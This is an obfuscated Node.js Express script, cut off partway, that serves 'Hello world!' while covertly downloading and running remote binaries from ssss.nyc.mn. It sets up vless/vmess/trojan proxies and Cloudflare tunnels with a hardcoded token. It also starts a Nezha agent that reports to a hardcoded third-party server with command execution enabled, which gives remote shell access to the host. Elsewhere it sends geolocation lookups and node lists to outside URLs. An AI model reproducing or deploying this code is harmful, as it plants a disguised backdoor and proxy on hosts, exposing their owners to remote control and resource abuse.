const _0x4d6dfd=_0x3c74;(function(_0x57ccd3,_0x4bf2ed){const _0x46dd0a={_0xf1d95f:0x141,_0xe65236:0x16e,_0x2e0285:0x13a,_0x171606:0xd8},_0x21e7da=_0x3c74,_0x1c778e=_0x57ccd3();while(!![]){try{const _0x20f339=parseInt(_0x21e7da(0xe7))/0x1*(parseInt(_0x21e7da(_0x46dd0a._0xf1d95f))/0x2)+-parseInt(_0x21e7da(0xee))/0x3+-parseInt(_0x21e7da(0x152))/0x4+parseInt(_0x21e7da(0x103))/0x5+parseInt(_0x21e7da(_0x46dd0a._0xe65236))/0x6+parseInt(_0x21e7da(_0x46dd0a._0x2e0285))/0x7*(parseInt(_0x21e7da(0xd6))/0x8)+parseInt(_0x21e7da(0xfd))/0x9*(-parseInt(_0x21e7da(_0x46dd0a._0x171606))/0xa);if(_0x20f339===_0x4bf2ed)break;else _0x1c778e['push'](_0x1c778e['shift']());}catch(_0x48bc48){_0x1c778e['push'](_0x1c778e['shift']());}}}(_0x3cea,0x8e40b));const express=require(_0x4d6dfd(0x13c)),app=express(),axios=require(_0x4d6dfd(0x13b)),os=require('os'),fs=require('fs'),path=require(_0x4d6dfd(0xf6)),{promisify}=require(_0x4d6dfd(0xf1)),exec=promisify(require('child_process')[_0x4d6dfd(0xe5)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x4d6dfd(0x109)]['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x4d6dfd(0xc6)]||'',AUTO_ACCESS=process[_0x4d6dfd(0x109)][_0x4d6dfd(0xc8)]||![],FILE_PATH=process[_0x4d6dfd(0x109)][_0x4d6dfd(0x171)]||'./tmp',SUB_PATH=process[_0x4d6dfd(0x109)][_0x4d6dfd(0x151)]||_0x4d6dfd(0xd0),PORT=process[_0x4d6dfd(0x109)][_0x4d6dfd(0x121)]||process[_0x4d6dfd(0x109)]['PORT']||0xbb8,UUID=process['env'][_0x4d6dfd(0xed)]||'6019cfdd-b685-4d5d-ac6a-37f2b3763498',NEZHA_SERVER=process[_0x4d6dfd(0x109)][_0x4d6dfd(0x104)]||_0x4d6dfd(0x105),NEZHA_PORT=process['env'][_0x4d6dfd(0x15d)]||'',NEZHA_KEY=process['env'][_0x4d6dfd(0x14f)]||_0x4d6dfd(0xfe),ARGO_DOMAIN=process[_0x4d6dfd(0x109)]['ARGO_DOMAIN']||_0x4d6dfd(0xc5),ARGO_AUTH=process['env'][_0x4d6dfd(0x11f)]||_0x4d6dfd(0xbf),ARGO_PORT=process['env'][_0x4d6dfd(0x166)]||0x1f41,CFIP=process[_0x4d6dfd(0x109)][_0x4d6dfd(0xca)]||_0x4d6dfd(0x154),CFPORT=process['env'][_0x4d6dfd(0x108)]||0x1bb,NAME=process[_0x4d6dfd(0x109)]['NAME']||_0x4d6dfd(0xd0);!fs['existsSync'](FILE_PATH)?(fs[_0x4d6dfd(0x114)](FILE_PATH),console[_0x4d6dfd(0x173)](FILE_PATH+'\x20is\x20created')):console[_0x4d6dfd(0x173)](FILE_PATH+_0x4d6dfd(0x14e));function generateRandomName(){const _0x2aac2b={_0x2cffae:0xfb,_0x190ba1:0x150},_0x2e346d=_0x4d6dfd,_0x5c63fe='abcdefghijklmnopqrstuvwxyz';let _0x355e0b='';for(let _0x2453ae=0x0;_0x2453ae<0x6;_0x2453ae++){_0x355e0b+=_0x5c63fe[_0x2e346d(0x15e)](Math[_0x2e346d(_0x2aac2b._0x2cffae)](Math[_0x2e346d(0x124)]()*_0x5c63fe[_0x2e346d(_0x2aac2b._0x190ba1)]));}return _0x355e0b;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x3cea(){const _0xd67e11=['post','\x0a\x20\x20tunnel:\x20','/sub.txt\x20saved\x20successfully','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x0a\x20\x20credentials-file:\x20','8443','config.yaml','\x0a\x20\x20\x20\x20','catch','exec','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','123TYVjrO','error','finish','\x22\x20>\x20/dev/null\x202>&1','split','toString','UUID','2330910QmUKyJ','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','2087','util','block','Error\x20executing\x20command:\x20','2096','App\x20is\x20running','path','\x20-p\x20','Error\x20reading\x20boot.log:','none','nohup\x20','floor','status','1269KZGkqV','HIUxVHWPrfgwhKuwavHpndcanAZCnOTf','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','true','ArgoDomain:','5057075RFquZk','NEZHA_SERVER','nz.5577472.xyz:8008','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','chmod','CFPORT','env','vmess','message','npm\x20running\x20error:\x20','writeFileSync','https://amd64.ssss.nyc.mn/v1','readFileSync','arm','127.0.0.1','country_code','org','mkdirSync','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Skipping\x20adding\x20automatic\x20access\x20task','https://arm64.ssss.nyc.mn/bot','https://amd64.ssss.nyc.mn/bot','freedom','fileUrl','pop','https://arm64.ssss.nyc.mn/agent','get','false','ARGO_AUTH','arm64','SERVER_PORT','del\x20/f\x20/q\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','random','/vmess-argo?ed=2560','&path=%2Ftrojan-argo%3Fed%3D2560#','unlink','win32','\x20-s\x20','match','tunnel.yml','Hello\x20world!','base64','\x20>\x20nul\x202>&1','\x20is\x20running','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Subscription\x20uploaded\x20successfully','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','tcp','&path=%2Fvless-argo%3Fed%3D2560#','boot.log','stream','443','/api/add-subscriptions','close','896154KLaApr','axios','express','test','arch','Add\x20automatic\x20access\x20task\x20faild:\x20','\x0a\x0atrojan://','17608fYwaVY','Empowerment\x20failed\x20for\x20','data','Download\x20','send','forEach','2083','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','http','all','unlinkSync','\x20failed:\x20','includes','\x20already\x20exists','NEZHA_KEY','length','SUB_PATH','1607360wJPQMD','?security=tls&sni=','cdns.doon.eu.org','then','TunnelSecret','application/json','fileName','pkill\x20-f\x20\x22[','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','createWriteStream','countryCode','NEZHA_PORT','charAt','set','\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','firefox','clear','basename','Unknown','ARGO_PORT','Error\x20downloading\x20files:','Content-Type','existsSync','\x0aclient_secret:\x20','?encryption=none&security=tls&sni=','rm\x20-rf\x20','direct','6244050hlxXjR','tls','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','FILE_PATH','/api/delete-nodes','log','\x0a\x0avmess://','/api/add-nodes','https://amd64.ssss.nyc.mn/agent','platform','web\x20running\x20error:\x20','join','/dev/null','automatic\x20access\x20task\x20added\x20successfully','blackhole','utf-8','listen','readdirSync','map','substring','vless','php\x20running\x20error:\x20','quic','eyJhIjoiNzkyMDRiNTk5Y2E4NTU3MTllZmFkZjhjMTY3MTYwMmUiLCJ0IjoiOWYyMTQ5YzQtZjY1OS00MzZiLWIwYmYtNDllN2VkNDZkZDVmIiwicyI6Ik9EVTBNVEJqTUdNdFpERTVNaTAwWkRFd0xXSTVNekF0TXpZNU1qUmtaREl3TWpGaSJ9','unshift','Nodes\x20uploaded\x20successfully','/tunnel.yml\x20run','from','Error\x20in\x20startserver:','leaflow.5577472.xyz','PROJECT_URL','taskkill\x20/f\x20/im\x20','AUTO_ACCESS','pipe','CFIP','stringify','NEZHA\x20variable\x20is\x20empty,skip\x20running','&fp=firefox&type=ws&host=','config.json','https://ipapi.co/json/','leaflow','filter','.exe\x20>\x20nul\x202>&1','response','tunnel.json','2053','32JfHuqk','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','133730yzGiGt','https://arm64.ssss.nyc.mn/web','/vmess-argo','/vless-argo'];_0x3cea=function(){return _0xd67e11;};return _0x3cea();}let npmPath=path[_0x4d6dfd(0x179)](FILE_PATH,npmName),phpPath=path[_0x4d6dfd(0x179)](FILE_PATH,phpName),webPath=path[_0x4d6dfd(0x179)](FILE_PATH,webName),botPath=path[_0x4d6dfd(0x179)](FILE_PATH,botName),subPath=path[_0x4d6dfd(0x179)](FILE_PATH,'sub.txt'),listPath=path[_0x4d6dfd(0x179)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x4d6dfd(0x135)),configPath=path[_0x4d6dfd(0x179)](FILE_PATH,_0x4d6dfd(0xce));function deleteNodes(){const _0x3326be={_0x781d19:0x10f,_0x47697d:0xc3,_0x6579f7:0xec,_0x29bc01:0xeb,_0xff2679:0xe4},_0x4d5c4f=_0x4d6dfd;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x100335;try{_0x100335=fs[_0x4d5c4f(_0x3326be._0x781d19)](subPath,_0x4d5c4f(0x17d));}catch{return null;}const _0x1664d0=Buffer[_0x4d5c4f(_0x3326be._0x47697d)](_0x100335,'base64')[_0x4d5c4f(_0x3326be._0x6579f7)](_0x4d5c4f(0x17d)),_0x3c4192=_0x1664d0[_0x4d5c4f(_0x3326be._0x29bc01)]('\x0a')['filter'](_0x402ed4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4d5c4f(0x13d)](_0x402ed4));if(_0x3c4192['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x4d5c4f(0x172),JSON['stringify']({'nodes':_0x3c4192}),{'headers':{'Content-Type':_0x4d5c4f(0x157)}})[_0x4d5c4f(_0x3326be._0xff2679)](_0x1506cb=>{return null;}),null;}catch(_0x2435cf){return null;}}function cleanupOldFiles(){const _0x301c2c={_0x1f9ed8:0x17f},_0x407160={_0x28cedd:0x179},_0xa15304=_0x4d6dfd;try{const _0x1f822b=fs[_0xa15304(_0x301c2c._0x1f9ed8)](FILE_PATH);_0x1f822b[_0xa15304(0x146)](_0x1872e1=>{const _0x458f8f=_0xa15304,_0xc6d7ee=path[_0x458f8f(_0x407160._0x28cedd)](FILE_PATH,_0x1872e1);try{const _0x3257d6=fs['statSync'](_0xc6d7ee);_0x3257d6['isFile']()&&fs['unlinkSync'](_0xc6d7ee);}catch(_0x32668b){}});}catch(_0x2bb371){}}app[_0x4d6dfd(0x11d)]('/',function(_0x1089f8,_0x26bf31){const _0x444fb1={_0x371d2b:0x12c},_0x1e0e0f=_0x4d6dfd;_0x26bf31[_0x1e0e0f(0x145)](_0x1e0e0f(_0x444fb1._0x371d2b));});async function generateConfig(){const _0x790647={_0x1214c1:0xdb,_0x4d11b5:0x133,_0x2d7fcc:0x111,_0x4f5452:0x182,_0x5ada0a:0xf9,_0x49bf7a:0x133,_0x2e60b2:0x149,_0x24c3cb:0x16f,_0x489a00:0x149,_0x21fbc5:0x17c},_0x20fdca=_0x4d6dfd,_0x54ed29={'log':{'access':_0x20fdca(0x17a),'error':_0x20fdca(0x17a),'loglevel':_0x20fdca(0xf9)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x20fdca(0x182),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x20fdca(0xf9),'fallbacks':[{'dest':0xbb9},{'path':_0x20fdca(_0x790647._0x1214c1),'dest':0xbba},{'path':_0x20fdca(0xda),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x20fdca(_0x790647._0x4d11b5)}},{'port':0xbb9,'listen':_0x20fdca(_0x790647._0x2d7fcc),'protocol':_0x20fdca(_0x790647._0x4f5452),'settings':{'clients':[{'id':UUID}],'decryption':_0x20fdca(_0x790647._0x5ada0a)},'streamSettings':{'network':_0x20fdca(_0x790647._0x49bf7a),'security':_0x20fdca(0xf9)}},{'port':0xbba,'listen':_0x20fdca(0x111),'protocol':_0x20fdca(0x182),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x20fdca(0xf9),'wsSettings':{'path':_0x20fdca(0xdb)}},'sniffing':{'enabled':!![],'destOverride':[_0x20fdca(_0x790647._0x2e60b2),'tls',_0x20fdca(0x184)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x20fdca(0x111),'protocol':_0x20fdca(0x10a),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x20fdca(0x149),_0x20fdca(_0x790647._0x24c3cb),_0x20fdca(0x184)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x20fdca(0x111),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x20fdca(0xf9),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x20fdca(_0x790647._0x489a00),_0x20fdca(_0x790647._0x24c3cb),_0x20fdca(0x184)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x20fdca(0x119),'tag':_0x20fdca(0x16d)},{'protocol':_0x20fdca(_0x790647._0x21fbc5),'tag':_0x20fdca(0xf2)}]};fs[_0x20fdca(0x10d)](path[_0x20fdca(0x179)](FILE_PATH,'config.json'),JSON['stringify'](_0x54ed29,null,0x2));}function getSystemArchitecture(){const _0x206847={_0x142f7f:0x110},_0x3822be=_0x4d6dfd,_0x51cf18=os[_0x3822be(0x13e)]();return _0x51cf18===_0x3822be(0x110)||_0x51cf18===_0x3822be(0x120)||_0x51cf18==='aarch64'?_0x3822be(_0x206847._0x142f7f):'amd';}function _0x3c74(_0x46d055,_0x256925){const _0x3cea85=_0x3cea();return _0x3c74=function(_0x3c74d0,_0x642c6e){_0x3c74d0=_0x3c74d0-0xbf;let _0x5170bd=_0x3cea85[_0x3c74d0];return _0x5170bd;},_0x3c74(_0x46d055,_0x256925);}function downloadFile(_0x459f7d,_0x59603e,_0x21c13d){const _0x288c91={_0x51d036:0x169,_0x16a652:0x114,_0x3da048:0x155},_0x28834f={_0x33c278:0x10b},_0x4ab007={_0x21244c:0xe9},_0x528e22={_0x84cff9:0x127,_0x405f5c:0x144,_0x423c8d:0x14c,_0x7f8839:0x10b},_0x108023={_0x12ce4c:0x139,_0x5c732e:0x173,_0x4176c0:0x164},_0x25750d=_0x4d6dfd,_0xe307d1=_0x459f7d;!fs[_0x25750d(_0x288c91._0x51d036)](FILE_PATH)&&fs[_0x25750d(_0x288c91._0x16a652)](FILE_PATH,{'recursive':!![]});const _0xf99d6c=fs[_0x25750d(0x15b)](_0xe307d1);axios({'method':_0x25750d(0x11d),'url':_0x59603e,'responseType':_0x25750d(0x136)})[_0x25750d(_0x288c91._0x3da048)](_0x39b0c7=>{const _0x158769=_0x25750d;_0x39b0c7[_0x158769(0x143)][_0x158769(0xc9)](_0xf99d6c),_0xf99d6c['on'](_0x158769(_0x4ab007._0x21244c),()=>{const _0x4f831e=_0x158769;_0xf99d6c[_0x4f831e(_0x108023._0x12ce4c)](),console[_0x4f831e(_0x108023._0x5c732e)](_0x4f831e(0x144)+path[_0x4f831e(_0x108023._0x4176c0)](_0xe307d1)+'\x20successfully'),_0x21c13d(null,_0xe307d1);}),_0xf99d6c['on'](_0x158769(0xe8),_0x59958c=>{const _0x2f4256=_0x158769;fs[_0x2f4256(_0x528e22._0x84cff9)](_0xe307d1,()=>{});const _0x49a1a4=_0x2f4256(_0x528e22._0x405f5c)+path[_0x2f4256(0x164)](_0xe307d1)+_0x2f4256(_0x528e22._0x423c8d)+_0x59958c[_0x2f4256(_0x528e22._0x7f8839)];console[_0x2f4256(0xe8)](_0x49a1a4),_0x21c13d(_0x49a1a4);});})[_0x25750d(0xe4)](_0x34ee4b=>{const _0x441a31=_0x25750d,_0x4e25a0='Download\x20'+path[_0x441a31(0x164)](_0xe307d1)+'\x20failed:\x20'+_0x34ee4b[_0x441a31(_0x28834f._0x33c278)];console[_0x441a31(0xe8)](_0x4e25a0),_0x21c13d(_0x4e25a0);});}async function downloadFilesAndRun(){const _0x228e82={_0x17e777:0x150,_0x456dcd:0x167,_0x54ad6f:0xe1,_0x2808e5:0xf4,_0x56f390:0xf0,_0x1b76e4:0x101,_0x4b1106:0x11e,_0x958478:0x16a,_0x146f44:0x106,_0x54fd2b:0x115,_0x349889:0x12f,_0x3c2337:0xe1,_0x43878d:0x147,_0x5bc50c:0xf7,_0x343071:0xe6,_0x3e3f5d:0x173,_0x3397a1:0x12f,_0x574d81:0x10c,_0x43d980:0xcc,_0x505ba2:0xe8,_0x256aab:0x12a,_0x3d6520:0x12a,_0x4e4318:0x15a,_0x3e0c61:0x160,_0x10bf95:0x12f},_0x4b2e98={_0x3065a1:0x146},_0x51ccb2=_0x4d6dfd,_0x46b3ab=getSystemArchitecture(),_0x1c8e27=getFilesForArchitecture(_0x46b3ab);if(_0x1c8e27[_0x51ccb2(_0x228e82._0x17e777)]===0x0){console[_0x51ccb2(0x173)](_0x51ccb2(0xd7));return;}const _0x4080f9=_0x1c8e27[_0x51ccb2(0x180)](_0x12c092=>{const _0x29a27b={_0x5c41ea:0x158};return new Promise((_0x597f62,_0x2b2d68)=>{const _0x91e15=_0x3c74;downloadFile(_0x12c092[_0x91e15(_0x29a27b._0x5c41ea)],_0x12c092[_0x91e15(0x11a)],(_0x429ce7,_0x5df9d8)=>{_0x429ce7?_0x2b2d68(_0x429ce7):_0x597f62(_0x5df9d8);});});});try{await Promise[_0x51ccb2(0x14a)](_0x4080f9);}catch(_0x5e990c){console[_0x51ccb2(0xe8)](_0x51ccb2(_0x228e82._0x456dcd),_0x5e990c);return;}function _0x97172f(_0x2c0618){const _0x172a04={_0x4fe86c:0x142},_0x11860d=_0x51ccb2,_0x5bd3b8=0x1fd;_0x2c0618[_0x11860d(_0x4b2e98._0x3065a1)](_0x4cae01=>{const _0x3f7775=_0x11860d;fs['existsSync'](_0x4cae01)&&fs[_0x3f7775(0x107)](_0x4cae01,_0x5bd3b8,_0x18d965=>{const _0x3ddfa2=_0x3f7775;_0x18d965?console['error'](_0x3ddfa2(_0x172a04._0x4fe86c)+_0x4cae01+':\x20'+_0x18d965):console[_0x3ddfa2(0x173)]('Empowerment\x20success\x20for\x20'+_0x4cae01+':\x20'+_0x5bd3b8['toString'](0x8));});});}const _0x33cee3=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x97172f(_0x33cee3);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x33cbba=NEZHA_SERVER[_0x51ccb2(0x14d)](':')?NEZHA_SERVER[_0x51ccb2(0xeb)](':')[_0x51ccb2(0x11b)]():'',_0x491255=new Set([_0x51ccb2(0x137),_0x51ccb2(_0x228e82._0x54ad6f),_0x51ccb2(_0x228e82._0x2808e5),_0x51ccb2(_0x228e82._0x56f390),_0x51ccb2(0x147),_0x51ccb2(0xd5)]),_0x45c280=_0x491255['has'](_0x33cbba)?_0x51ccb2(_0x228e82._0x1b76e4):_0x51ccb2(_0x228e82._0x4b1106),_0x3b8edf=_0x51ccb2(_0x228e82._0x958478)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x51ccb2(_0x228e82._0x146f44)+_0x45c280+_0x51ccb2(0x100)+UUID;fs[_0x51ccb2(0x10d)](path[_0x51ccb2(0x179)](FILE_PATH,_0x51ccb2(0xe2)),_0x3b8edf);const _0x4bf7c7=_0x51ccb2(0xfa)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x51ccb2(_0x228e82._0x54fd2b);try{await exec(_0x4bf7c7),console['log'](phpName+_0x51ccb2(_0x228e82._0x349889)),await new Promise(_0x127f17=>setTimeout(_0x127f17,0x3e8));}catch(_0x107563){console[_0x51ccb2(0xe8)](_0x51ccb2(0x183)+_0x107563);}}else{let _0x1f1f8c='';const _0x3b1648=['443',_0x51ccb2(_0x228e82._0x3c2337),_0x51ccb2(0xf4),_0x51ccb2(0xf0),_0x51ccb2(_0x228e82._0x43878d),_0x51ccb2(0xd5)];_0x3b1648[_0x51ccb2(0x14d)](NEZHA_PORT)&&(_0x1f1f8c='--tls');const _0x5d3bce=_0x51ccb2(0xfa)+npmPath+_0x51ccb2(0x129)+NEZHA_SERVER+':'+NEZHA_PORT+_0x51ccb2(_0x228e82._0x5bc50c)+NEZHA_KEY+'\x20'+_0x1f1f8c+_0x51ccb2(_0x228e82._0x343071);try{await exec(_0x5d3bce),console[_0x51ccb2(_0x228e82._0x3e3f5d)](npmName+_0x51ccb2(_0x228e82._0x3397a1)),await new Promise(_0x869ddb=>setTimeout(_0x869ddb,0x3e8));}catch(_0x2f61c0){console[_0x51ccb2(0xe8)](_0x51ccb2(_0x228e82._0x574d81)+_0x2f61c0);}}}else console[_0x51ccb2(_0x228e82._0x3e3f5d)](_0x51ccb2(_0x228e82._0x43d980));const _0x172969=_0x51ccb2(0xfa)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x172969),console[_0x51ccb2(0x173)](webName+_0x51ccb2(_0x228e82._0x349889)),await new Promise(_0x2b1103=>setTimeout(_0x2b1103,0x3e8));}catch(_0x3aecbd){console[_0x51ccb2(_0x228e82._0x505ba2)](_0x51ccb2(0x178)+_0x3aecbd);}if(fs[_0x51ccb2(0x169)](botPath)){let _0x22638a;if(ARGO_AUTH[_0x51ccb2(_0x228e82._0x256aab)](/^[A-Z0-9a-z=]{120,250}$/))_0x22638a='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x51ccb2(_0x228e82._0x3d6520)](/TunnelSecret/)?_0x22638a=_0x51ccb2(0xef)+FILE_PATH+_0x51ccb2(0xc2):_0x22638a=_0x51ccb2(0x170)+FILE_PATH+_0x51ccb2(_0x228e82._0x4e4318)+ARGO_PORT;try{await exec(_0x51ccb2(0xfa)+botPath+'\x20'+_0x22638a+_0x51ccb2(_0x228e82._0x3e0c61)),console['log'](botName+_0x51ccb2(_0x228e82._0x10bf95)),await new Promise(_0x5da915=>setTimeout(_0x5da915,0x7d0));}catch(_0x1ed5fc){console[_0x51ccb2(0xe8)](_0x51ccb2(0xf3)+_0x1ed5fc);}}await new Promise(_0x301985=>setTimeout(_0x301985,0x1388));}function getFilesForArchitecture(_0x4a9ff6){const _0x41c8e3={_0x21f88d:0x110,_0x171f68:0x11c,_0xf7317f:0x176},_0x3ac44f=_0x4d6dfd;let _0xba4f4d;_0x4a9ff6===_0x3ac44f(_0x41c8e3._0x21f88d)?_0xba4f4d=[{'fileName':webPath,'fileUrl':_0x3ac44f(0xd9)},{'fileName':botPath,'fileUrl':_0x3ac44f(0x117)}]:_0xba4f4d=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x3ac44f(0x118)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x33027a=_0x4a9ff6==='arm'?_0x3ac44f(_0x41c8e3._0x171f68):_0x3ac44f(_0x41c8e3._0xf7317f);_0xba4f4d[_0x3ac44f(0xc0)]({'fileName':npmPath,'fileUrl':_0x33027a});}else{const _0x571ee4=_0x4a9ff6===_0x3ac44f(_0x41c8e3._0x21f88d)?'https://arm64.ssss.nyc.mn/v1':_0x3ac44f(0x10e);_0xba4f4d['unshift']({'fileName':phpPath,'fileUrl':_0x571ee4});}}return _0xba4f4d;}function argoType(){const _0x49117a={_0x4a6785:0x14d,_0x18bf7b:0x10d,_0xf1fcbd:0xd4,_0x1edaae:0xdd,_0x11f2ef:0xeb,_0x278461:0xff,_0x3f5c04:0x130,_0x1f814e:0x161,_0x5f3d4f:0x10d,_0x30127c:0x12b,_0x1c52c3:0x173,_0x20040b:0x123},_0x2eac97=_0x4d6dfd;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2eac97(0x173)](_0x2eac97(0xdf));return;}if(ARGO_AUTH[_0x2eac97(_0x49117a._0x4a6785)](_0x2eac97(0x156))){fs[_0x2eac97(_0x49117a._0x18bf7b)](path[_0x2eac97(0x179)](FILE_PATH,_0x2eac97(_0x49117a._0xf1fcbd)),ARGO_AUTH);const _0x11e2ce=_0x2eac97(_0x49117a._0x1edaae)+ARGO_AUTH[_0x2eac97(_0x49117a._0x11f2ef)]('\x22')[0xb]+_0x2eac97(0xe0)+path['join'](FILE_PATH,_0x2eac97(0xd4))+_0x2eac97(_0x49117a._0x278461)+ARGO_DOMAIN+_0x2eac97(_0x49117a._0x3f5c04)+ARGO_PORT+_0x2eac97(_0x49117a._0x1f814e);fs[_0x2eac97(_0x49117a._0x5f3d4f)](path['join'](FILE_PATH,_0x2eac97(_0x49117a._0x30127c)),_0x11e2ce);}else console[_0x2eac97(_0x49117a._0x1c52c3)](_0x2eac97(_0x49117a._0x20040b));}async function extractDomains(){const _0x833169={_0x34d069:0x17d,_0x59eaf1:0xeb,_0x2d559e:0x173,_0x1a700f:0x148,_0x56c477:0x179,_0x22083e:0x135,_0x171a9b:0x170,_0x474de6:0x160,_0x433bf1:0xe8,_0x289fd6:0xf3,_0xe00c1:0xf8},_0x22b1d8={_0x4f8aee:0xcf,_0x4b85d3:0x143,_0x1e424c:0x113,_0x138352:0x143,_0x54d14c:0x15c},_0x231ff1={_0x4b885b:0x177,_0x1c929b:0xc7,_0x38c6da:0xd2,_0x450e09:0x181,_0x60656c:0xea},_0x37c343=_0x4d6dfd;let _0x510505;if(ARGO_AUTH&&ARGO_DOMAIN)_0x510505=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x510505),await _0x5cf517(_0x510505);else try{const _0x11888e=fs['readFileSync'](path['join'](FILE_PATH,_0x37c343(0x135)),_0x37c343(_0x833169._0x34d069)),_0x2360ca=_0x11888e[_0x37c343(_0x833169._0x59eaf1)]('\x0a'),_0x454eb0=[];_0x2360ca['forEach'](_0x38690f=>{const _0x46d0fd=_0x38690f['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x46d0fd){const _0x280c19=_0x46d0fd[0x1];_0x454eb0['push'](_0x280c19);}});if(_0x454eb0[_0x37c343(0x150)]>0x0)_0x510505=_0x454eb0[0x0],console['log'](_0x37c343(0x102),_0x510505),await _0x5cf517(_0x510505);else{console[_0x37c343(_0x833169._0x2d559e)](_0x37c343(_0x833169._0x1a700f)),fs[_0x37c343(0x14b)](path[_0x37c343(_0x833169._0x56c477)](FILE_PATH,_0x37c343(_0x833169._0x22083e)));async function _0x391d74(){const _0xbd972e=_0x37c343;try{process[_0xbd972e(_0x231ff1._0x4b885b)]===_0xbd972e(0x128)?await exec(_0xbd972e(_0x231ff1._0x1c929b)+botName+_0xbd972e(_0x231ff1._0x38c6da)):await exec(_0xbd972e(0x159)+botName['charAt'](0x0)+']'+botName[_0xbd972e(_0x231ff1._0x450e09)](0x1)+_0xbd972e(_0x231ff1._0x60656c));}catch(_0x59c1eb){}}_0x391d74(),await new Promise(_0x32d357=>setTimeout(_0x32d357,0xbb8));const _0x4ed916=_0x37c343(_0x833169._0x171a9b)+FILE_PATH+_0x37c343(0x15a)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x4ed916+_0x37c343(_0x833169._0x474de6)),console[_0x37c343(0x173)](botName+_0x37c343(0x12f)),await new Promise(_0x476c02=>setTimeout(_0x476c02,0xbb8)),await extractDomains();}catch(_0xba6afe){console[_0x37c343(_0x833169._0x433bf1)](_0x37c343(_0x833169._0x289fd6)+_0xba6afe);}}}catch(_0x1fa7ed){console['error'](_0x37c343(_0x833169._0xe00c1),_0x1fa7ed);}async function _0x2b985e(){const _0x493031=_0x37c343;try{const _0x2343f7=await axios[_0x493031(0x11d)](_0x493031(_0x22b1d8._0x4f8aee),{'timeout':0xbb8});if(_0x2343f7[_0x493031(0x143)]&&_0x2343f7[_0x493031(_0x22b1d8._0x4b85d3)][_0x493031(0x112)]&&_0x2343f7['data'][_0x493031(_0x22b1d8._0x1e424c)])return _0x2343f7[_0x493031(0x143)][_0x493031(0x112)]+'_'+_0x2343f7[_0x493031(0x143)]['org'];}catch(_0x25eeb0){try{const _0x1a24d9=await axios[_0x493031(0x11d)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x1a24d9['data']&&_0x1a24d9['data']['status']==='success'&&_0x1a24d9[_0x493031(_0x22b1d8._0x138352)]['countryCode']&&_0x1a24d9[_0x493031(0x143)]['org'])return _0x1a24d9[_0x493031(0x143)][_0x493031(_0x22b1d8._0x54d14c)]+'_'+_0x1a24d9['data'][_0x493031(0x113)];}catch(_0xd79c08){}}return _0x493031(0x165);}async function _0x5cf517(_0x103826){const 